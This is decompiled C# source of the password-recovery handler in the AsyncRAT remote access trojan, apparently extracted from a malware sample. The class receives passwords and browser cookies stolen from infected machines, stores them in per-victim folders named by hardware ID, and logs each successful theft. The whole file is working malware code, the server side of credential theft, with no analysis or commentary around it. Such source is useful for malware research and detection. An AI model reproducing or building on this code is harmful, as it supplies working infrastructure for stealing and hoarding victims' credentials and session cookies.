// Decompiled with JetBrains decompiler
// Type: Server.Handle_Packet.HandleRecovery
// Assembly: AsyncRAT, Version=0.5.7.0, Culture=neutral, PublicKeyToken=null
// MVID: 51786A10-CF9D-455B-B8A4-B82CB9EDE322
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-HackTool.MSIL.Alien.gen-bb1f2c2c9b279790b67eaea6ab0bbce3a4d4432bbe1bd716750f2f9ba3337f7e.exe

using Server.Connection;
using Server.MessagePack;
using System;
using System.Drawing;
using System.IO;
using System.Windows.Forms;

namespace Server.Handle_Packet
{
  public class HandleRecovery
  {
    public HandleRecovery(Clients client, MsgPack unpack_msgpack)
    {
      try
      {
        string path = Path.Combine(Application.StartupPath, "ClientsFolder", unpack_msgpack.ForcePathObject("Hwid").AsString, "Recovery");
        string asString1 = unpack_msgpack.ForcePathObject("Password").AsString;
        string asString2 = unpack_msgpack.ForcePathObject("Cookies").AsString;
        if (!string.IsNullOrWhiteSpace(asString1) || !string.IsNullOrWhiteSpace(asString2))
        {
          if (!Directory.Exists(path))
            Directory.CreateDirectory(path);
          File.WriteAllText(path + "\\Password_" + DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss") + ".txt", asString1.Replace("\n", Environment.NewLine));
          File.WriteAllText(path + "\\Cookies_" + DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss") + ".txt", asString2);
          new HandleLogs().Addmsg("Client " + client.Ip + " recovered passwords successfully @ ClientsFolder \\ " + unpack_msgpack.ForcePathObject("Hwid").AsString + " \\ Recovery", Color.Purple);
        }
        else
          new HandleLogs().Addmsg("Client " + client.Ip + " has no passwords", Color.MediumPurple);
        client?.Disconnected();
      }
      catch (Exception ex)
      {
        new HandleLogs().Addmsg(ex.Message, Color.Red);
      }
    }
  }
}
